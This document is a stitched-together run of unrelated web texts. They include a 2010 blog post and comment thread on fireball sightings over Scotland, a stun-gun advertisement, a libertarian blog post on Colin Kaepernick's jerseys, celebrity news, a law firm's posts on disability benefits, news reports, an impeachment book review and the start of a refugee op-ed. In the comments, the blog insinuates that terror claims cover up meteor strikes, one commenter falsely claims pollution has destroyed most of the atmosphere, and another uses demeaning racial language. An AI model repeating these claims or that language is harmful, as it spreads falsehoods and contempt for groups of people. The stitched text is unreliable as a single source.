Three days ago, on November 15th, eyewitnesses in Glasgow and as far South as Birmingham, reported intense white meteorites at about 0540 GMT.
Commenting on the BBC Scotland web site, Douglas Thornton, from Scotlandwell said:
"It was an off-white light with a massive tail behind it... A phenomenal sight. You can see shooting stars every night up where we are, but this was the most enormous streak of light. Enough to back-light the clouds and make them flicker. It was moving at an enormous speed. I first saw it in the direction of Auchterarder and by the time I lost sight of it about two seconds later, it was around the Dundee area."
As he was heading South from the North coast of Scotland, David Wood reported seeing a "bright green, fairly jagged looking, object in the sky":
"It had a very short, but very bright yellow and red trail behind it. It could have only been a few hundred meters above the ground. After my initial view I slowed the car and it broke in two. The larger piece eventually broke up into four smaller pieces which then dissipated into the darkness."
Remember, the Leonids rarely, if ever, fall below 80kms altitude. Clearly, what these Scots and English folks were seeing was either not the Leonids, or the Leonids have decided to change course. Could there be a connection with an explosion in a remote forest area? Come to think of it, I seem to remember a meteorite hitting a remote forest area in the not-too-distant past.
But I digress, the point to remember is that we need not concern ourselves with such trivial and alarming speculation, we have the ubiquitous and equally alarming 'terror threat' to explain away all such mysterious detonations, even in remote Scottish forests, where, as everyone knows, Muslim terrorists just love to hang out and blow up trees. In short, the 'anti-terrorism police' are on the scene, they've found a hole, and they're looking into it. Heck, if they look hard enough, they may even find some 'detonators' lying at the bottom of it.

Well,ok
there might be a scientific explanation to this. During the past 200 years with the start of the industrial revolution (careful with all kinds of revolutions) it seems that pollution has destroyed most of the atmosphere that was protecting us. While in the past space masses of all sorts would have burned out before reaching ground level now with most of the atmosphere missing(you didn't expect to tell you that of course did you ?) there isn't much left to protect us. I'm afraid though we've destroyed something we can't replace or fix. Not to mention that atmosphere pollution continues.
Joe · 2010-11-18T16:23:12Z
But GP2...it was al-Qaeda blowing up trees!
kksalm · 2010-11-18T18:53:52Z
Sounds like
a wonderful destination for stargazers and rock hunting. Any pubs in the vicinity?
richsw · 2010-11-18T20:00:01Z
Sorry GP2...
While there may be considerably more atmospheric pollution in recent years, possible our atmosphere has most certainly not been "destroyed". It is still just as 'thick' as ever, however, it appears that the cosmic debris now impacting our planet contains many bodies of a much higher size and weight compared to the last few hundred years or so. If this is the case, then many of the pieces have a much greater chance of making it either to the surface or to explode at a much lower altitude where quite a bit of damage can result.
If you haven't checked out the "Comets and Catastrophe" section (lower left side of page) then it might be a good idea to do so.
GP2 · 2010-11-18T21:35:03Z
I know of
a catstrophe hitting us all given time but don't want to spoil the party.
DonaldJHunt · 2010-11-18T22:39:06Z
Wait a minute...
Are you saying that Muslim terrorists now have meteorites at their disposal? Dang, that's serious... (LOL)
forge · 2010-11-19T02:45:17Z
what will Govment do
if these explosions multiply in cities where soon everybody will see there is no terrorists?
Don't worry, they will announce in TV networks:
Terrorist-METEORS ATTACK!!
al-Qaeda from Outer Space! Hurling meteors toward us. Hate them!!!
or..
On one serene morning a family is on picnic in the forest. The little girl gets bored adorning her doll with flowers and asks excitedly:
- Mommy, can i blow up now my toy-terrorist-bomb?
Euan · 2010-11-19T02:52:17Z
Move along folks...
I used to blow things up in the coutryside around Glasgow in my youth. It was probably someone's youthful prank.
Joe · 2010-11-19T03:09:38Z
Did they call the anti-terrorism police on you too Euan?
GP2 · 2010-11-19T08:12:17Z
Joe,seriously now...
I think Eaun has the most probable explanation.
Scott · 2010-11-19T10:39:05Z
> I think Eaun has the most probable explanation.
No. It was swamp gas.
GP2 · 2010-11-19T12:09:52Z
I see everyone is in
a mood for a good joke. The CCC ratings are definitely up! Well, the truth finally has to come out. I'm an Al-Qaeda member and we were doing some tests. But we have Governmet clearance :-P
Joe · 2010-11-19T16:35:55Z
As a nipper
I often enjoyed a day out blowing up "wide areas of forest". Anti-terrorist police these days are so out of tune with young people.
GP2 · 2010-11-20T06:16:15Z
Oh, come on
the aliens are hitting us with meteorites ! :-P
Conkers · 2010-11-20T17:01:05Z
Lets just back up here...
There's two points being made in both the article and the comments.
1. Mainstream media is covering up the (possible) cometary bombardment of the planet by using terrorism as the excuse. This "future" bombardment remains to be seen. We don't know yet. And..
2. Mainstream media will use the terrorism card at any opportunity. This, there is no doubt of.

Stun Guns (View All)Stun Guns are one of the most popular self-defense products on the market today. Endorsed by police and rescue personnel across the country, they make for the perfect defense against a would-be attacker. Stun guns are easy to use, affordable, non-lethal and extremely effective at giving you or your loved one the opportunity to escape and alert authorities. Stun guns use a high-voltage, low-current electrical discharge to override the body’s superficial muscle-triggering mechanisms. As a result, the recipient is immobilized. The low-current is what makes it non-lethal. Generally, stun guns are about 2-3 mA, where 100 mA is lethal to humans. In addition to typical stun guns you may have seen on television and magazines, technology has advanced to create unique stun devices that look like cell phones, pens and even flashlights. Your attacker won’t even know what hit him! We offer one of the largest selections of stun guns by some of the biggest names, including Stun Master and ZAP. Before purchasing a stun gun, you should check the Stun Gun Laws and restrictions to make sure they are legal in your area.
Concealed Stun GunsConcealed and Hidden Stun Guns Concealed Stun Guns are a great self-defense weapon for anyone who needs to keep a low key as to what they are carrying. Keep them in your purse, on your belt, or even hold them right in your hand! No one will know you’re carrying millions of volts of stopping power. These concealed stun guns very popular and offer the power of surprise.
Flashlight Stun GunsStun Guns with Flashlights Flashlight Stun Guns are a great self-defense product to keep around the house, automobile, or anywhere else that you might be faced with danger.

Target Liberty: Colin Kaepernick Just Sold Out His #IMWITHKAP Jersey in Hours
Sunday, September 16, 2018
Colin Kaepernick Just Sold Out His #IMWITHKAP Jersey in Hours
Colin Kaepernick sold out a customized jersey emblazoned with the hashtag #IMWITHKAP from his personal website in a number of hours Monday evening, reports The San Francisco Chronicle.
The jerseys, which aren't
affiliated with Nike, retailed at $174.99 for adults and $99.99 for kids.
It is unclear how many jerseys were sold.
Kaepernick announced the release of the jerseys in a tweet Monday morning. The original announcement said 20 percent of the proceeds would go to the Know Your Rights Camp, a campaign founded by Kaepernick.
The Know Your Rights Camp homepage features this gibberish:
OUR 10-POINT SYSTEM
1. YOU HAVE THE RIGHT TO BE FREE.
2. YOU HAVE THE RIGHT TO BE HEALTHY.
3. YOU HAVE THE RIGHT TO BE BRILLIANT.
4. YOU HAVE THE RIGHT TO BE SAFE.
5. YOU HAVE THE RIGHT TO BE LOVED.
6. YOU HAVE THE RIGHT TO BE COURAGEOUS.
7. YOU HAVE THE RIGHT TO BE ALIVE.
8. YOU HAVE THE RIGHT TO BE TRUSTED.
9. YOU HAVE THE RIGHT TO BE EDUCATED.
10. YOU HAVE THE RIGHT TO KNOW YOUR RIGHTS.
The right to be healthy?
To be brilliant?
To be loved?
Kaepernick is promoting snake oil, echo chamber, philosophy that makes no sense and can quickly lead to the thinking there is a role for government to enforce these "rights."

There aren't enough urban primitives to drive these kinds of sales ... or are there? Make no mistake: the majority of the sales and the shoes are going to virtue signalling GoodWhites so they can distinguish themselves from those BadWhites. You know... Trump voters. They like to feel like they too are cool Urban Primitives as long as they don't have to actually live with them.

Why can't libertarians figure out a way to make liberty appaing to people who want to be cool.
I mean, we're the ones talking about guns and drugs. We should look like badasses.

Robert Pattinson Beat Up, Shirtless in New ‘Rover’ Trailer (watch!)
Keith Girard 5 years ago No Comments
Listen to this article
Robert Pattinson learns a thing or two about survival in his role in the upcoming movie ‘The Rover.’
Robert Pattinson is a quivering bowl of jelly in a new trailer for his upcoming film “The Rover.” His character learns about survival and being a man in a harsh, post-apocalyptic future ruled by criminal gangs.
He’s a far cry from the Rob fans know and love on the big screen as Edward Cullen in the “Twilight” vampire series.
But the role is far meatier and he still takes off his shirt!
Pattinson stars as Reynolds, an outlaw gang member who helps rob steely drifter named Eric, played by Guy Pearce.
In the melee, the gang drives off with Eric’s car, but leaves a wounded Reynolds behind, giving him up for dead.
Eric patches up Reynolds and enlists him to help track down the gang, which includes Reynolds’ brother. Reynold’s loyalties are torn as he unwillingly assists in the manhunt.
The movie’s first full trailer is largely a scene setter that lays out the harsh environment and flashes from one tense moment to another as Eric and Reynolds warily co-exist, each depending on the other for survival.
And, yes, Rob briefly appears shirtless.
Check out the trailer below. “The Rover” will hit theaters in the U.S. on July 18, according to the film’s Twitter account. The Rover will be released Aug. 22 in the UK.

Rihanna Tears It Up on Saturday Night Live (watch!)

Listen to this article
Rihanna was at her sexy best as the musical guest on “Saturday Night Live,” adding spice to an otherwise lackluster show. (Photo: ScreenCap)
Rihanna was at her sexy best as the musical guest on “Saturday Night Live,” adding spice to an otherwise lackluster show. She performed two numbers, including the dance from her “Where Have You Been” video.
For her new song, the curtain rose on the 24-year-old singer lounging on a gold chaise covered by opaque netting in an ancient Egyptian themed set.
She was surrounded by burly, shirtless men and a harem of dancers. Rihanna was dressed in a black and white crop top and a leather miniskirt with a wide gold belt and black boots.
Although the singer is not known for lots of choreography on tour, she showed she could dance with the best of them in her video for “Where Have You Been.” She performed the same routine live on SNL and looked flawless. Also, no lip-syncing here.
Here earlier performance was a medley of “Birthday Cake” and “Talk that Talk.” She wore thigh-high black boots, tiny hot pants and a sheer, loose-fitting top and a jewel-encrusted baseball cap.
her brief performance of “Birthday Cake” may have been a shout-out to ex-boyfriend Chris Brown. Earlier on her Twitter page, she wrote “Happy Birthday @chrisbrown.”
Check out her performances below, let us know your thoughts and be sure to follow IM on Twitter for the latest music news.

Columnist Says Payroll Tax Reallocation Could Help SSDI Funding
Posted on September 9, 2013 by Troutman & Troutman
Reuters recently ran a column by Mark Miller, which discussed Social Security Disability Insurance (SSDI), titled Disability is the other Social Security Fight We Need to Have Now. The column focused on SSDI funding, which is expected to deplete in 2016.
Miller went into detail about how legislators have solutions to alleviate cuts to benefits. “All Congress needs to do is reallocate a small portion of payroll tax revenues from the retirement to the disability program,” Miller said. “Reallocations have been done at least six times in the past- most recently in 1994 – with funds moving in both directions. These reallocations have not been controversial, and this time around, a shift of just 1/10th of 1 percent would equalize the long-range outlook of the two trust funds, according to Stephen Goss, the Social Security Administration’s chief actuary.”
Miller said that a shift in politics has lawmakers “headed toward another dangerous game of chicken over the debt ceiling, and Republicans likely will try to insist on entitlement program cuts as part of a deal.” This could mean arguments over what some politicians consider “entitlement” programs.
As we have told you before, SSDI is not an entitlement program—it is a social safety net. Only in cases of severe disabilities are benefits awarded after an initial application.
Both SSDI and Supplemental Security Income (SSI) have contributed to reducing poverty levels in America. In order to qualify for SSDI benefits, a person must have earned work credits and have a consultative examination with a doctor. If you have questions about disability benefits, do not hesitate to contact our Tulsa Social Security disability lawyers for a free consultation. You may also reach us by phone at (918) 587-0050.

Half of All Veterans Applying for Disability Benefits
Posted on June 27, 2012 by Troutman & Troutman
On Monday we discussed how severe the impact can be when women suffer disabilities. Because they are less likely to have private coverage than men, women often face more difficult financial times when they are unable to work due to a disability. Today we continue our look at particular groups of people who are more likely than others to feel the impact of a disability that prevents them from working. We discuss the case of veterans who suffer disabilities while serving our country.
Disability claims from veterans are at their highest levels ever. Of the 1.6 million veterans from the wars in Iraq and Afghanistan, just shy of 50 percent have filed disability claims. For comparison, after the 1990-1991 Gulf War, about 21 percent of servicemembers filed a claim.
Veterans are also filing claims for a larger number of medical conditions, likely a result of improved medical diagnoses and treatments since past conflicts. Injured servicemembers today are much more likely to survive than in years past (95 percent of those injured in Iraq or Afghanistan have survived their injuries). Today’s veterans have claimed an average of eight to nine ailments including hearing loss, back pain and post-traumatic stress. Vietnam veteran claims have, on average, involved less than four ailments, and World War II and Korea veteran claims have typically involved two.
How Can Veterans Take Advantage of Social Security Disability Benefits?
The main difference between disability benefits from the military and those from Social Security is that military benefits are proportional. If you suffered a relatively minor injury, for example, the VA may decide that you are 10 percent disabled and award you benefits accordingly. With Social Security benefits (either SSDI or SSI), you must be completely disabled and unable to work at all. SSDI and SSI benefits are all or nothing. Veterans can use an expedited application process if they suffered their injuries while serving on active duty; the expedited process can be of great assistance, as the process can take years for other applicants.
Are you a veteran who suffered a disability and is unable to work? Contact a Tulsa SSI attorney to learn about eligibility for SSDI or SSI benefits.

'Marginal value theorem' predicts movements of human hunter-gatherers
"This study provides new insight about how our hominin ancestors might have moved as groups across ancient landscapes," said evolutionary biologist Vivek V. Venkataraman.

A study in the 1970s found Malaysia's Batek people moved from camp to camp every eight days. A researcher at Harvard University recently used data from the original study to determine a "marginal value theorem" that can predict the movement of hunter-gatherer camps like the Batek.

March 6 (UPI) -- New research shows the "marginal value theorem" successfully predicts the movement of human hunter-gatherer camps like those of the Batek, an indigenous people living in the rainforest of Peninsular Malaysia.
The theorem has previously been used to describe the search for maximum foraging efficiency by species like bees. The new study, published in the journal PNAS, confirms the formula can be used to analyze human movements.
"Our results support what many anthropologists have long suspected -- that hunter-gatherers relocate their camps in response to how fast they deplete local resources," evolutionary biologist Vivek V. Venkataraman, said in a news release. "This study provides new insight about how our hominin ancestors might have moved as groups across ancient landscapes."
Venkataraman, now a postdoctoral researcher at Harvard University, conducted the newly published research while a grad student at Dartmouth University.
RELATED Long-distance migratory patterns of birds follow peaks in resources
The new study used data collected by cultural anthropologists Kirk and Karen Endicott, Dartmouth researchers who studied the movements and foraging behaviors of the Batek in the 1970s.
Though the Batek people are now mostly stationary, they once lived nomadically, subsisting on hunted small game and gathered wild yams and fruit. The Endicotts measured the Batek's movements as well as the rate at which they depleted local resources.
Venkataraman used the data from the Endicotts' research and the marginal value theorem to build a predictive model. The model's results were very similar to the records of Batek migration documented by Kirk and Karen Endicott.
RELATED 'Drunken walk' math helps explain ecological invasions
"In the 1970s, Karen and I had the rare opportunity to live with a group of fully nomadic Batek foragers, who became enthusiastic partners in our efforts to record their acquisition of food," said Kirk Endicott, professor emeritus of anthropology at Dartmouth. "We are delighted that our talented young colleagues, coming from evolutionary biology, have been able to use some of the data we collected back then to address important questions in hunter-gatherer studies, including the determinants of camp movements."

Pelosi, Ryan call for Conyers to resign amid sexual harassment scandal

Nov. 30 (UPI) -- House Minority Leader Nancy Pelosi and Speaker Paul Ryan called for Rep. John Conyers to resign on Thursday as sexual harassment allegations have mounted against him.
"The allegations against Congressman Conyers, as we have learned more since Sunday, are serious, disappointing and very credible," Pelosi said during a briefing in the Capitol.
"It's very sad. The brave women who have come forward are owed justice. I pray for Congressman Conyers and his family, and wish them well. However, Congressman Conyers should resign," Pelosi said.
Moments later, Ryan also came forward asking for Conyers to resign.
RELATED Paul Ryan: Sexual harassment in Congress won't be tolerated
"This needs to be a workplace where everyone feels safe and respected," Ryan said. "No woman should have to endure harassment in any form in any institution, let alone here in Congress.
This comes as Conyers was hospitalized in Detroit on Thursday.
Sam Riddle, a family friend of Conyers, said the Michigan Democrat is "resting comfortably" with his wife at the hospital, but did not give a reason why he was admitted.
RELATED Rep. John Conyers steps down amid sexual harassment investigation
"John Conyers is doing okay, as well as can be expected for a gentleman that's approaching 90 years of age," Riddle said. "You can wait out here all you want; he won't be coming out."
The 88-year-old congressman returned to Detroit this week after sexual harassment accusations continued to pile up from former staffers.
One of the women, Marion Brown, spoke to NBC's Today.
RELATED Ethics committee opens probe into Conyers harassment allegations
"Some of the things that he did, it was sexual harassment," Brown said. "Violating my body, propositioning me, inviting me to hotels with the guise of discussing business, and then propositioning for sex. He just violated my body. He has touched me in different ways, and it was very uncomfortable and very unprofessional."
Conyers stepped down from his position as the ranking Democrat on the House Judiciary Committee but denied the allegations.
"Many of [the accusations] were raised by documents reportedly paid for by a partisan alt-right blogger." Conyers tweeted. "I very much look forward to vindicating myself and my family before the House Committee on Ethics."
Riddle said Conyer's health issues were stress-related from recent media attacks that Conyers was "used to" from "serial attackers."
"The congressman's health is not what it should be and lot of that is directly attributable to this media assault," he said.

Rep. Farenthold Won't Seek Re-election Amid Sexual Harassment Allegations

Rep. Farenthold Won't Seek Re-election Amid Sexual Harassment Allegations
share
Print
U.S. Congressman Blake Farenthold, the target of sexual harassment allegations, will not seek re-election in 2018, according to House Speaker Paul Ryan.
"I think he's making the right decision to retire," Ryan said Thursday on Capitol Hill. "There are new stories that are very disconcerting."
The Texas Republican lawmaker has denied engaging in any inappropriate behavior and has said he plans to stay in office for the remainder of his term.
Farenthold is the fourth lawmaker whose career has been derailed in the last two weeks because of allegations of sexual misconduct.
Last week, two Democratic lawmakers, Senator Al Franken and Congressman John Conyers, resigned over such allegations. Republican lawmaker Trent Franks was forced out by Speaker Ryan after a staffer complained Franks offered her $5 million to carry his child as a surrogate.
With $84,000 in taxpayer money, Farenthold settled a lawsuit that was filed in 2014 by Lauren Greene, a former communications director in Farenthold's office, who alleged Farenthold sexually harassed her and dismissed her shortly after complaining of working in a hostile environment. When he settled the case in 2015, Farenthold denied he engaged in inappropriate behavior.
Word of Farenthold's decision not to seek re-election comes as the House Ethics Committee expands an investigation into his behavior toward Greene and allegations of sexual harassment and inappropriate behavior from other former staff members.
More than a dozen women have renewed charges first made last year that President Donald Trump sexually harassed them before he entered the White House, prompting 50 female congresswomen to call earlier this week for an investigation or that he resign. Six senators, five Democrats and one independent, called for Trump's resignation this week in the face of the allegations.

Can impeachment appear legitimate in a hyper-partisan universe?
What it would take
Can impeachment appear legitimate in a hyper-partisan universe?
By Carlos Lozada
January 25, 2019
“Some mode of displacing an unfit magistrate is rendered indispensable by the fallibility of those who choose, as well as the corruptibility of the man chosen.” — George Mason, Constitutional Convention, June 1787
“We’re going to go in there. We’re going to impeach the motherf—er.” — Rep. Rashida Tlaib (D-Mich.), Jan. 3
The contrast between these two statements reveals everything about the challenge of exercising Article II, Section 4 of the Constitution and attempting to remove President Trump from office. By now, the “unfit” condition of this magistrate is clear, as is his disdain for the principles and traditions of American public life. But the fitness of Congress, the sole branch empowered to impeach and convict the president, also bears scrutiny.

Is the least-trusted institution in America — rated lower than big banks, the news media and the presidency itself — ready to investigate and try a president in a way that conveys legitimacy and inspires broad confidence? And could the American public, already so divided and cynical, regard whatever outcome emerges from that process as nonpartisan and fair?
These questions loom over the numerous guides and retrospectives on presidential impeachment — authored by historians, law professors, journalists and assorted commentators — that have appeared in the two years since Trump swore the oath of office. (For some reason, many publishers imagined that a refresher might come in handy.) Partisanship, they contend, poisons impeachment, both the process and its legacy. This is the paradox: When a demagogic or authoritarian leader comes to power by stoking cultural division and partisan hatreds, the need for impeachment grows, but so does the difficulty of seeing it through.
George Mason, James Madison & Co. would hardly have been surprised by the current boom in impeachment talk. They feared a president who might “pervert his administration” into a scheme for personal enrichment or “betray his trust to foreign powers.” They worried that “the man who has practiced corruption and by that means procured his appointment in the first instance, be suffered to escape punishment.”
Yet impeachment is the nuclear option of American politics, “nullifying the will of voters,” historian Jeffrey Engel emphasizes in “Impeachment: An American History.” So the drafters of the Constitution spent months considering who would ultimately wield that power. Should it be the Senate or the Supreme Court? A vote of state legislatures or governors? The final choice of the House of Representatives (a simple majority vote for impeachment) and the Senate (a two-thirds majority for conviction) flowed from contrasting imperatives, Laurence Tribe and Joshua Matz explain in “To End a Presidency,” a thorough look at the history and legalities of impeachment. The House, directly elected and more susceptible to the passions of the moment, “could credibly claim unique authority to speak for the American people,” whereas the Senate could strive for greater impartiality, wisdom and rigor.

Placing this power in Congress rather than the courts makes impeachment as much a political process as a legal one. But calling it political does not denigrate impeachment; it elevates it. Impeachment should be political, reflecting the nature of impeachable offenses and the judgments that should be brought to bear when considering it. The endlessly parsed phrase “high Crimes and Misdemeanors” does not cover policy differences, unpopularity, personal animus or simple “maladministration” on the part of the president, a term the framers considered but dismissed as so vague that it would leave presidents at the mercy of Congress. In fact, an impeachable offense need not involve the commission of a crime. Rather, it must feature misdeeds that “so seriously threaten the order of political society as to make pestilent and dangerous the continuance in power of their perpetrator,” wrote the late legal scholar Charles L. Black Jr. in his classic 1974 study, “Impeachment: A Handbook,” reissued last year. Impeachment ought to follow egregious abuses of power that constitute, in Engel’s description, wrongdoing “against the entire American people.”
In “Impeachment: A Citizen’s Guide,” law professor Cass Sunstein acknowledges the political dimensions of impeachment but emphasizes the high standards and judgment that should be brought to bear. “It is in part because the standard is high that political opponents of presidents have so rarely resorted to the impeachment mechanism,” he writes. “Despised presidents, and bad presidents, have hardly ever been impeached, which is a tribute to the Rule of Law.” The problem is not that the process could be political but that it could easily become too partisan, another weapon in a permanent campaign. “When an impeachment is purely partisan, or appears that way, it is presumptively illegitimate,” Tribe and Matz warn.

Indeed, the impeachment efforts historians remember as least legitimate are precisely those, such as the case of President Bill Clinton, that were most partisan. “For both Clinton and his foes, the impeachment battle was not so much a search for facts or even a debate about what this generation of Americans believed constituted high crimes and misdemeanors than it was another political contest to be won or lost,” writes New York Times reporter Peter Baker, a contributor to “Impeachment: An American History.” By contrast, the House Judiciary Committee’s action against President Richard Nixon reflected a judicious and painstaking effort, one that would eventually compel Nixon to resign rather than face impeachment in the House — where the Judiciary Committee had approved three articles of impeachment on a bipartisan basis — as well as likely conviction in the Senate at the hands of both Republicans and Democrats.
“What has changed is ourselves,” writes Columbia law professor Philip Bobbitt in an essay appearing alongside Black’s rereleased impeachment study. “We no longer have the confidence in the leadership of Congress that we had in the Nixon era.” In 1973, some 42 percent of Americans expressed “a great deal” or “quite a lot” of confidence in Congress, according to Gallup polls. By 2018, that total had dropped to 11 percent.
The presidents enduring impeachment proceedings hardly help matters, typically painting the efforts as purely partisan. “The law case will be decided by the PR case,” Nixon argued to his chief of staff in the heat of the Watergate saga; he also complained that his lawyer, James St. Clair, treated the impeachment inquiry “too much as a trial” rather than a raw partisan fight. Historian Timothy Naftali, founding director of the Nixon Presidential Library and a contributor to “Impeachment: An American History,” emphasizes how that view nearly succeeded, largely because, for a long time, “the Republican partisan mind refused to absorb the incriminating nature of the [White House] tapes.”
Similarly, during the Clinton impeachment, Democrats attempted to turn every skirmish with the Republicans and the special counsel into a party-line war. “The more partisan the impeachment effort looked, the less legitimate it would seem in the eyes of the public,” Baker writes. “While they decried partisanship, the Democrats intentionally tried to promote it.” Even the Starr report’s descriptions of Clinton’s personal encounters with Monica Lewinsky managed to help the president, by making his rivals seem more obsessed with sex than with the Constitution. “For Clinton, the release of the report was a public humiliation but a political boon,” Baker explains.
Clinton’s behavior in the Lewinksy scandal, though sordid, abusive and duplicitous, offers a less obvious catalogue of impeachable offenses than Nixon’s electoral sabotage, abuses of power and obstruction of justice. Yet Clinton’s inquisitors seemed to display deeper personal aversion toward their target than did Nixon’s antagonists. Just compare Rep. Peter Rodino (D-N.J.), the chairman of the House Judiciary Committee during Watergate, who worked to build bipartisanship and appealed to what he called “the middle,” with the hard-charging House majority whip during the Clinton era, Rep. Tom DeLay (R-Tex.), who referred to the impeachment effort as “The Campaign.”

The presidency survived the Watergate, Iran-contra and Clinton scandals. Trump will exact a higher toll.
Even with evidence of ‘high crimes,’ impeaching Trump would probably fail
What’s worse than leaving Trump in office? Impeaching him.
Trump has at times offered a positive case against impeachment. “How do you impeach somebody that’s doing a great job?” he asked last fall. But more often, he assails the accusations and investigations against him as hoaxes, witch hunts or desperate moves by “angry Dems,” all in an attempt to preemptively delegitimize any grounds for tossing him out. In this light, comments such as Tlaib’s “motherf—er” moment only affirm his argument.
Indeed, the more partisan the books against him, the less persuasive they feel. “Trump Must Go: The Top 100 Reasons to Dump Trump (and One to Keep Him)” by liberal commentator Bill Press exemplifies the genre. Press mixes the prospect of Russian collusion with the president’s personality quirks (such as Trump’s Twitter addiction), speculation about his health (“he may be certifiably mentally ill”) and policy disagreements (on issues from marijuana to the national debt) to argue that Trump needs to leave office now. Even the alleged “pee tape” of Russia dossier lore, “which none of us have seen, but which many of us just know exists,” makes a cameo.
When scholars argue that the removal of a president must be bipartisan, they are expressing less an opinion than a historical fact. Nixon still enjoyed the support of roughly a quarter of American voters when he resigned, and he could have counted on some 10 to 15 Republican votes in the Senate, writes Williams College legal scholar Alan Hirsch in “Impeaching the President.” But the public would have accepted his removal, Hirsch explains, because significant numbers of Republicans in both chambers supported it. Similarly, it was the partnership between Sens. Tom Daschle, a South Dakota Democrat, and Trent Lott, a Mississippi Republican, that made the conclusion of Clinton’s Senate trial a somewhat bipartisan undertaking.
In some ways, the Trump era combines the most toxic elements of the Nixon and Clinton episodes: the likelihood of impeachment-level wrongdoing, as well as inflamed — and deeply personal — partisan opposition. In such an environment, impeachment proceedings could harden, not ease, our national divisions, Tribe and Matz write. “Virtually every source of dysfunction in our democracy — hyperpartisanship, dark money, fake news, manufactured outrage, cultural warfare — could be magnified tenfold by an impeachment.”
Of course, that hardly means it shouldn’t happen.
In 1868, the House of Representatives designated special managers to handle President Andrew Johnson’s impeachment. Pictured are, front row from left, Reps. Benjamin F. Butler, Thaddeus Stevens, Thomas Williams and John A. Bingham; and, back row from left, Reps. James F. Wilson, George S. Boutwell and John A. Logan. (Mathew Brady/MPI/Getty Images)
Perhaps the most instructive case today — and one undergoing something of a historical revision — is the 1868 impeachment of President Andrew Johnson. In his contribution to “Impeachment: An American History,” historian Jon Meacham highlights the parallels with our era: “an obstinate president; a divided Congress; a nation that seemed intractably tribal; fears that the grand American experiment in democracy was coming to an end; and, as a capstone, a battle over the legitimacy of the president.”
The impeachment of Johnson, a Democratic vice president thrust into the Oval Office after Abraham Lincoln’s assassination, has often been remembered as a partisan exercise, and in many ways it was. The Republican-led Congress despised Johnson, deriding him as “Acting President,” “His Accidency” and “His Vulgarity.” And Johnson’s precipitating offense — violating the Tenure of Office Act by firing the secretary of war without Senate approval — was a technicality, a trap, not a serious constitutional violation. Impeached in the House, he survived in the Senate by a single vote, in part because some senators feared his potential successor, the controversial Sen. Benjamin Wade (R-Ohio).
But scholars today also stress the legitimate reasons for seeking Johnson’s ouster. In a nation just emerging from an existential conflict over slavery, Johnson opposed the 14th Amendment granting citizenship to former slaves and vetoed major civil rights legislation. When Congress overrode him, the president refused to enforce the law properly. He was, in many respects, still fighting for the cause of the defeated South. “Johnson’s virulent use of executive power to sabotage Reconstruction posed a mortal threat to the nation — and to civil and political rights — as reconstituted after the Civil War,” Tribe and Matz write. “These were not ordinary policy disagreements.”
In a comprehensive Atlantic essay making a case for Trump’s impeachment, historian and journalist Yoni Appelbaum looks back on the Johnson episode and sees justice, not partisanship. Johnson wanted to “restore America as it had been” before the war, he writes, shorn of slavery but with little else changed. “If his impeachment was partisan, it was because one party had been formed to defend the freedom of man, and the other had not yet reconciled itself to that proposition.” Although Johnson served out his full term, the close call damaged his political prospects so badly that he did not stand for a second term. “The chorus of experts who now present Johnson’s impeachment as an exercise in raw partisanship are not learning from history,” Appelbaum concludes, “but, rather, erasing it.”

Many GOP politicians dislike Trump. They’re terrified to admit it.
Impeaching Trump wouldn’t help restore the rule of law
Today, it is tempting to imagine that Trump’s impeachment and removal would take the country back to a saner, simpler time. This illusion ignores the enduring forces that brought Trump to power as well as the risks of impeachment itself. “I confess to a very strong sense of the dreadfulness of the step of removal, of the deep wounding such a step must inflict on the country,” Black writes. Engel warns that impeachment “disrupts the American political landscape as few other events do, leaving scars for generations.” A failed impeachment drive could encourage the president’s most dangerous impulses, and even if it succeeds, impeachment only kicks out an offending leader, “it doesn’t fix the democratic decline that brought [him] to power,” Tribe and Matz remind. “It doesn’t undo the havoc he wreaked while in office. And it doesn’t forestall the trauma of expelling him.” They worry that core supporters of the impeached leader would consider his removal “a gussied-up coup d’etat” and walk away from the American project, drift toward revolutionary politics or even commit violence — “especially if the ousted president refuses to depart gracefully and instead terrorizes the polity that rejected him.” And a graceful exit is hard to imagine under current management.
Yet not undertaking impeachment can be momentous as well. Sunstein does fear a wholly partisan impeachment effort, but he’s just as concerned about the failure to impeach when justified. “If a president systematically overreaches in his use of executive authority, or puts civil rights and civil liberties seriously at risk, he is likely to have, or to be able to get, the backing of a lot of Americans — at the very least, a big chunk of the electorate. Will We the People end up doing anything in response? I don’t know. That’s worth worrying about.”
Even if the new Democratic majority in the House decides to move forward on impeachment, the Senate remains in Republican hands. Reaching 67 senators seems unlikely, except when recalling the Nixon era. “Nixon’s saga reveals that when support for an embattled presidency fades, it cascades,” Engel writes. “Why did so many Americans change their minds so quickly? Because the facts changed.”
That is why, if lawmakers do begin an impeachment process, truth, not partisan fury, must remain the foremost value — and that means offering a full accounting of Trump’s offenses. There is a compulsion on the part of some of the president’s critics to hinge everything on the work of special counsel Robert Mueller, the Godot of the Trump era, as if specific legal misdeeds are the only issue. “Proof that a crime occurred can feel comfortingly objective,” Tribe and Matz write. “It relieves us of the need to exercise judgment and casts a technical gloss over bitterly divisive political questions.”
Obstruction of justice, violation of the emoluments clause, the betrayal of trust to a foreign adversary — any one of these is a significant misdeed that should be core to any impeachment process. Yet they all reflect Trump’s greatest offense against the American public and the American experiment, which is his lack of interest in faithfully executing the office of the president. His biggest lie, out of so many, occurred when he swore the oath and then, in his inaugural address, pledged to be a leader for all Americans. Trump governs for his own interests and those of his family, and for the cheers of his base. His opponents righteously declare that he is “not my president,” forgetting that Trump made that choice for them long ago.

Refugees are already vigorously vetted. I know because I vetted them.
A former immigration officer describes the long, grueling process of gaining refugee status in the United States.

By Natasha Hall
Natasha Hall has worked with refugees and on conflict for more than 10 years, specializing in the Middle East. She currently works on humanitarian efforts in Syria and lives in Istanbul, Turkey.
February 1, 2017
I conducted one of my last interviews as an immigration officer with the Department of Homeland Security in Istanbul, with Mahmoud and his 8-year-old son from Aleppo, Syria. The boy had lost his legs in the explosion that killed Mahmoud’s wife, sister and other children. It was supposed to be his first day at school in two years. Instead, they were in my office, reliving the worst experiences of their lives in an attempt to come to the United States. Mahmoud trembled as he spoke about returning to his home from work one day and digging his family members out of the rubble.
I had never been both so sad and so proud that this boy would be able to come to the United States and start school and a new life. Now I imagine them, four years after leaving Syria and three years after registering as refugees, being told to go back. Go back where?
This is what President Trump’s recent executive order has done. The order bans entry for citizens of seven countries for 90 days, suspends all refugee admissions for 120 days, halves the total number of refugees allowed into the United States this year and bars refugees from Syria indefinitely. It demands “a uniform screening standard and procedure,” “questions aimed at identifying fraudulent answers and malicious intent,” “a mechanism to ensure that the applicant is who the applicant claims to be” and “a mechanism to assess whether or not the applicant has the intent to commit criminal or terrorist acts.”
